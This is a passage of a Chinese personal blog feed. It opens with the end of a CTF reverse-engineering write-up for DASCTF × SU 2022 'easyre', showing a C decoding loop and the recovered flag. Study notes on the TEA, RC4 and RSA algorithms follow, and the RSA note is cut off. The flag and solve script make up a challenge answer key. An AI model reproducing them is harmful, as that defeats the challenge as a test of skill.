class="number">6</span>] = <span class="number">11</span>;</span><br><span class="line">v2[<span class="number">7</span>] = <span class="number">-76</span>;</span><br><span class="line">v2[<span class="number">8</span>] = <span class="number">85</span>;</span><br><span class="line">v2[<span class="number">9</span>] = <span class="number">-34</span>;</span><br><span class="line">v2[<span class="number">10</span>] = <span class="number">34</span>;</span><br><span class="line">v2[<span class="number">11</span>] = <span class="number">-125</span>;</span><br><span class="line">v2[<span class="number">12</span>] = <span class="number">47</span>;</span><br><span class="line">v2[<span class="number">13</span>] = <span class="number">-105</span>;</span><br><span class="line">v2[<span class="number">14</span>] = <span class="number">-72</span>;</span><br><span class="line">v2[<span class="number">15</span>] = <span class="number">32</span>;</span><br><span class="line">v2[<span class="number">16</span>] = <span class="number">29</span>;</span><br><span class="line">v2[<span class="number">17</span>] = <span class="number">116</span>;</span><br><span class="line">v2[<span class="number">18</span>] = <span class="number">-47</span>;</span><br><span class="line">v2[<span class="number">19</span>] = <span class="number">1</span>;</span><br><span class="line">v2[<span class="number">20</span>] = <span class="number">115</span>;</span><br><span class="line">v2[<span class="number">21</span>] = <span class="number">26</span>;</span><br><span class="line">v2[<span class="number">22</span>] = <span class="number">-78</span>;</span><br><span class="line">v2[<span class="number">23</span>] = <span class="number">-56</span>;</span><br><span class="line">v2[<span class="number">24</span>] = <span class="number">-59</span>;</span><br><span class="line">v2[<span class="number">25</span>] = <span class="number">116</span>;</span><br><span class="line">v2[<span class="number">26</span>] = <span class="number">-64</span>;</span><br><span class="line">v2[<span class="number">27</span>] = <span class="number">91</span>;</span><br><span class="line">v2[<span class="number">28</span>] = <span class="number">-9</span>;</span><br><span class="line">v2[<span class="number">29</span>] = <span class="number">15</span>;</span><br><span class="line">v2[<span class="number">30</span>] = <span class="number">-45</span>;</span><br><span class="line">v2[<span class="number">31</span>] = <span class="number">1</span>;</span><br><span class="line">v2[<span class="number">32</span>] = <span class="number">85</span>;</span><br><span class="line">v2[<span class="number">33</span>] = <span class="number">-78</span>;</span><br><span class="line">v2[<span class="number">34</span>] = <span class="number">-92</span>;</span><br><span class="line">v2[<span class="number">35</span>] = <span class="number">-82</span>;</span><br><span class="line">v2[<span class="number">36</span>] = <span class="number">123</span>;</span><br><span class="line">v2[<span class="number">37</span>] = <span class="number">-84</span>;</span><br><span class="line">v2[<span class="number">38</span>] = <span class="number">92</span>;</span><br><span class="line">v2[<span class="number">39</span>] = <span class="number">86</span>;</span><br><span class="line">v2[<span class="number">40</span>] = <span class="number">-68</span>;</span><br><span class="line">v2[<span class="number">41</span>] = <span class="number">35</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">v2[i] = ((v2[i] - <span class="number">71</span>) ^ (k[i] &amp; <span class="number">0xff</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v2);  </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//DASCTF&#123;Welc0me-t0-j01n-SU-l0ve-suyug1eg1e&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目来源：DASCTF × SU 2022 —— easyre</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> RC4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TEA算法</title>
      <link href="/2022/04/01/TEA%E7%AE%97%E6%B3%95/"/>
      <url>/2022/04/01/TEA%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="tea简介"><a class="markdownIt-Anchor" href="#tea简介">#</a> TEA 简介</h2><p>TEA（Tiny Encryption Algorithm）是一种分组<a href="https://baike.baidu.com/item/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/2816213">加密算法</a>，TEA 算法最初是由剑桥计算机实验室的 David Wheeler 和 Roger Needham 在 1994 年设计的</p><p>TEA 算法使用 64 位的明文分组和 128 位的<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5/101144">密钥</a>，它使用 Feistel 分组加密<a href="https://baike.baidu.com/item/%E6%A1%86%E6%9E%B6/1212667">框架</a>，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了。该算法使用了一个神秘常数 δ 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 δ 的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1) 231」（也就是程序中的 0×9E3779B9）</p><p>之后 TEA 算法被发现存在缺陷，作为回应，设计者提出了一个 TEA 的升级版本 ——XTEA（有时也被称为 “tean”）。XTEA 跟 TEA 使用了相同的简单运算，但它采用了截然不同的顺序，为了阻止密钥表攻击，四个子密钥（在加密过程中，原 128 位的密钥被拆分为 4 个 32 位的子密钥）采用了一种不太正规的方式进行混合，但速度更慢了</p><h2 id="加密解密过程"><a class="markdownIt-Anchor" href="#加密解密过程">#</a> 加密解密过程</h2><p>这里有一个大佬写的 c 语言脚本可以实现 TEA 加密，我们以这个脚本来分析一下它的加解密过程</p><h3 id="加密过程"><a class="markdownIt-Anchor" href="#加密过程">#</a> 加密过程</h3><h4 id="32位无符号整数"><a class="markdownIt-Anchor" href="#32位无符号整数">#</a> 32 位无符号整数</h4><p>整型的每一种都有无符号（unsigned）和有符号（signed）两种类型（float 和 double 总是带符号），在默认情况下声明的整型变量都是有符号类型，如果要声明其不是无符号，则需要在类型前加上 unsigned。这两者的区别就是，无符号类型可以保存两倍于有符号类型的正整数数据，比如 16 位系统中 int 能储存的数据范围为 - 32768~32767，而无符号的范围则是 0 ~ 65535.</p><p>而在我们的脚本中，uint32_t 就是定义其为 32 位无符号整数，关于其还要注意，当某个数据不可能为负数的时候我们就可以这样定义：uint32_t，unsigned char, unsigned int, size_t, uint64_t, unsigned long int，也可以这么理解，当有些数据我们不知道是正是负时，就不能用以上定义.</p><p>此外，在运算两个 32 位无符号整数时要注意它会不会超过它的最大值，比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> a,b,c;</span><br><span class="line"><span class="type">uint64_t</span> s;</span><br><span class="line">s = a * b + c;</span><br></pre></td></tr></table></figure><p>在这个运算中 a*b 可能会超过 uint32_t 的最大值，所以我们要这样写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = （(<span class="type">uint64_t</span>)a )* b + c；</span><br></pre></td></tr></table></figure><p>我们现在再来看脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="comment">//加密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    encrypt(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，v 就是要加密的数据，是两个<strong> 32 位无符号整数</strong>，而 k 是加密解密的密钥，为 4 个 32 位无符号整数，即密钥长度为 128 位，这个 delta 是为了保证每一轮加密都不同，一般都是 0x9e3779b9，但有的也不一定是这个，这个要根据情况而定</p><p>加密过程其实很好理解，就不多解释了，这个是 TEA 算法家族中最简单的，因为还有很多魔改 TEA 也就是 XTEA、XXTEA，我哭</p><h3 id="解密过程"><a class="markdownIt-Anchor" href="#解密过程">#</a> 解密过程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++)</span><br><span class="line">&#123;                           <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                             <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>（未完持续）</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4算法</title>
      <link href="/2022/03/31/RC4%E7%AE%97%E6%B3%95/"/>
      <url>/2022/03/31/RC4%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="rc4算法的基本原理"><a class="markdownIt-Anchor" href="#rc4算法的基本原理">#</a> <strong>RC4 算法的基本原理：</strong></h3><p>RC4 属于对称密码算法中的<strong>流密码</strong>加密算法，它的密钥长度是可变的，它以一个足够大的表 S 为基础，对表进行非线性变换，产生密钥流</p><blockquote><p>对称密码：加密和解密使用的是同一个密钥，即明文和密钥异或生成密文</p><p>流密码：逐字节，一个字节一个字节进行加密，和它对应的是块加密（分组加密），比较有代表性的就是 DES 加密算法（我还没学）</p></blockquote><p>既然是逐字节进行加密，那么它的重点就是密钥了，RC4 算法是一个密钥长度可变的加密算法，也就是说它的密钥可以是任意长度，而这个密钥流就是以一个足够大的 S 表为基础，并对其进行非线性变换产生的</p><h3 id="加密过程"><a class="markdownIt-Anchor" href="#加密过程">#</a> <strong>加密过程</strong></h3><h4 id="初始化s表"><a class="markdownIt-Anchor" href="#初始化s表">#</a> 初始化 S 表</h4><ol><li>对 S 表进行线性填充，一般为 256 个字节</li><li>用<strong>种子密钥</strong>填充另一个 256 字节的 K 表</li><li>用 K 表对 S 表进行初始置换</li></ol><h4 id="密钥流的生成"><a class="markdownIt-Anchor" href="#密钥流的生成">#</a> 密钥流的生成</h4><p>为每个待加密的字节生成一个伪随机数，用来进行异或运算（表 S 一旦生成，种子密钥就不再被使用）</p><h3 id="初始化s表-2"><a class="markdownIt-Anchor" href="#初始化s表-2">#</a> 初始化 S 表：</h3><p>第一步，我们首先对 S 表进行一个升序填充，从 0 到 255，也就是 S [0]=0，S [1]=1，S [2]=2，直到 S [255]=255；第二步要用到密钥，也就是种子密钥，用种子密钥来填充另一个 256 字节的 K 表，这个密钥的长度一般不会很长，比如我们现在密钥是 3，4，5，那么我们就用 3，4，5 来循环填充这个 K 表一直到 K [255]；第三步用 K 表对 S 表进行初始置换，也就是从 S [0] 开始到 S [255]，对每个 S [i] 根据 K [i] 确定的一个方案，将 S [i] 置换为 S 中的另一个字节，对于这个初始置换，我们举一个例子</p><p>S 表：</p><table><thead><tr><th style="text-align:center">0</th><th style="text-align:center">1</th><th style="text-align:center">2</th><th style="text-align:center">3</th><th style="text-align:center">4</th><th style="text-align:center">5</th><th style="text-align:center">6</th></tr></thead><tbody><tr><td style="text-align:center">S[0]</td><td style="text-align:center">S[1]</td><td style="text-align:center">S[2]</td><td style="text-align:center">S[3]</td><td style="text-align:center">S[4]</td><td style="text-align:center">S[5]</td><td style="text-align:center">S[6]</td></tr></tbody></table><p>K 表：</p><table><thead><tr><th style="text-align:center">3</th><th style="text-align:center">4</th><th style="text-align:center">5</th><th style="text-align:center">3</th><th style="text-align:center">4</th><th style="text-align:center">5</th><th style="text-align:center">3</th></tr></thead><tbody><tr><td style="text-align:center">K[0]</td><td style="text-align:center">K[1]</td><td style="text-align:center">K[2]</td><td style="text-align:center">K[3]</td><td style="text-align:center">K[4]</td><td style="text-align:center">K[5]</td><td style="text-align:center">K[6]</td></tr></tbody></table><p>置换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">0</span> to <span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">j=(j+S[i]+K[i]) mod <span class="number">256</span>;  <span class="comment">//实际上只要除以7就可以了，因为我们举的例子是7位的表</span></span><br><span class="line">Swap(S[i], S[j]);</span><br></pre></td></tr></table></figure><p>我们取 i，j 都为 0，从 0 到 255 开始查值，然后通过第三行 j 的计算得到一个下标，那么我们就把当前操作位的值和这一位的值进行一个置换，比如第 0 位的计算过程是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">j=(0+S[0]+K[0]) mod 7 = 3 mod 7 = 3</span><br></pre></td></tr></table></figure><p>所以我们将第 0 位的值和第三位的值进行一个交换，那么从 0 到 6 每个值都进行变换之后我们就得到了一个新的 S 表：</p><table><thead><tr><th style="text-align:center">3</th><th style="text-align:center">0</th><th style="text-align:center">1</th><th style="text-align:center">4</th><th style="text-align:center">5</th><th style="text-align:center">2</th><th style="text-align:center">6</th></tr></thead><tbody><tr><td style="text-align:center">S[0]</td><td style="text-align:center">S[1]</td><td style="text-align:center">S[2]</td><td style="text-align:center">S[3]</td><td style="text-align:center">S[4]</td><td style="text-align:center">S[5]</td><td style="text-align:center">S[6]</td></tr></tbody></table><h3 id="密钥流的生成-2"><a class="markdownIt-Anchor" href="#密钥流的生成-2">#</a> 密钥流的生成：</h3><p>因为是流密码，所以我们要为每一个待加密的字节生成一个用来与之进行异或运算的伪随机值，这个数值也是从 S 表中获取，所以我们要做的就是找到这个随机数的下标，也就是这个随机数是 S 几，下面是生成密钥流的操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> r=<span class="number">0</span> to len <span class="keyword">do</span>  <span class="comment">//r为明文长度，r字节</span></span><br><span class="line">i=(i+<span class="number">1</span>) mod <span class="number">256</span>;</span><br><span class="line">j=(j+S[i]) mod <span class="number">256</span>;</span><br><span class="line">swap(S[i], S[j]);</span><br><span class="line">t=(S[i]+S[j]) mod <span class="number">256</span>;</span><br><span class="line">K[r]=S[t];</span><br></pre></td></tr></table></figure><p>这个 K 就是伪随机数值所组成的一个数组，t 是 S 的下标，我们就是要找到这个下标也就是这个 t，那么这个 t 又是通过 S [i] 和 S [j] 来进行计算，然后 i 和 j 又是通过第 3、4 行来计算，即：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i=(i+<span class="number">1</span>) mod <span class="number">7</span> = <span class="number">0</span>+<span class="number">1</span> mod <span class="number">7</span> = <span class="number">1</span>；</span><br><span class="line">j=(j+S[i]) mod <span class="number">7</span> = <span class="number">0</span>+S[<span class="number">1</span>] mod <span class="number">7</span> = <span class="number">0</span>+<span class="number">0</span> mod <span class="number">7</span> = <span class="number">0</span>；</span><br><span class="line">swap(S[<span class="number">0</span>], S[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>需要注意的是，在每次算完 i 和 j 之后都会有两个值的交换，也就是说每一轮之后这个 S 表都是变了的，都是不一样的，然后计算 t 后将对应下标的值传给 K 表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = S[<span class="number">0</span>]+S[<span class="number">1</span>] mod <span class="number">7</span> = <span class="number">3</span>;</span><br><span class="line">S[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">K[<span class="number">0</span>] = S[<span class="number">3</span>] = <span class="number">4</span>;</span><br></pre></td></tr></table></figure><p>那么和 S [0] 进行异或运算的伪随机数就是这个 K [0]，以此类推，最终得到密文</p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> <strong>总结：</strong></h3><p>以一个 256 字节的 S 表为基础，使用密钥填充一个 K 表，再用这个 K 表对 S 表进行初始置换，密钥不同生成的 S 表也不同，然后我们要取明文的长度，明文多长，密钥流就多长，通过运算生成密钥流，这个运算过程就是一个找下标 t 的过程，而每一次的随机数的生成都会对 S 表（此时的 S 表是明文长度的 S 表）进行两个数字的置换，所以每一轮的 S 表都是不同的，最后我们拿这个密钥流也就是 K 表，与明文一一对应地进行异或运算，得出密文，这就是总体的过程</p><p>实战可以看这篇博客：<a href="http://tchdv.cn/2022/04/03/DASCTF%C3%97SU2022-easyre/">DASCTF×SU2022-easyre | ChengHan’s Blog (tchdv.cn)</a></p><p>参考视频 ——<a href="https://www.bilibili.com/video/BV1G64y1Y7p4?p=2&amp;spm_id_from=pageDriver">RC4 加密算法 | 流密码 | 对称密码 | 密码学 | 信息安全_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA算法</title>
      <link href="/2022/03/25/RSA%E7%AE%97%E6%B3%95/"/>
      <url>/2022/03/25/RSA%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="rsa加密"><a class="markdownIt-Anchor" href="#rsa加密">#</a> <strong>RSA 加密</strong></h3><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>密文</mtext><mo>=</mo><mtext>明</mtext><msup><mtext>文</mtext><mi>E</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">密文 = 明文^E mod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">文</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8913309999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">明</span><span class="mord"><span class="mord cjk_fallback">文</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></span></p><p>E 为 encryption (加密) 的缩写</p><h3 id="rsa解密"><a class="markdownIt-Anchor" href="#rsa解密">#</a> <strong>RSA 解密</strong></h3><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>明文</mtext><mo>=</mo><mtext>密</mtext><msup><mtext>文</mtext><mi>D</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">明文 = 密文^D mod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">文</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8913309999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">密</span><span class="mord"><span class="mord cjk_fallback">文</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></span></p><p>D 为 decryption (解密) 的缩写</p><h3 id="生成密钥对"><a class="markdownIt-Anchor" href="#生成密钥对">#</a> <strong>生成密钥对</strong></h3><p>密钥对为（E, D, N）</p><p>要生成密钥对，还要分别求出 N, L, E, D</p><h4 id="求n"><a class="markdownIt-Anchor" href="#求n">#</a> 求 N</h4><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>N</mi><mo>=</mo><mi>p</mi><mo>×</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">N = p × q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><p>其中 p 和 q 是两个质数（素数），这两个质数不能太小，否则容易被破解</p><blockquote><p><strong>质数又称素数，一个大于 1 的自然数，除了 1 和它自身外，不能被其他自然数整除的数叫做质数</strong></p></blockquote><h4 id="求l"><a class="markdownIt-Anchor" href="#求l">#</a> 求 L</h4><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L = (p-1) × (q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mi>l</mi><mi>c</mi><mi>m</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L = lcm(p-1, q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p>其中 L 是 p-1 和 q-1 的最小公倍数，lcm 就是最小公倍数的意思</p><p>L 是一个中间变量，我们需要求出 L 以求出 E</p><h4 id="求e"><a class="markdownIt-Anchor" href="#求e">#</a> 求 E</h4><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" 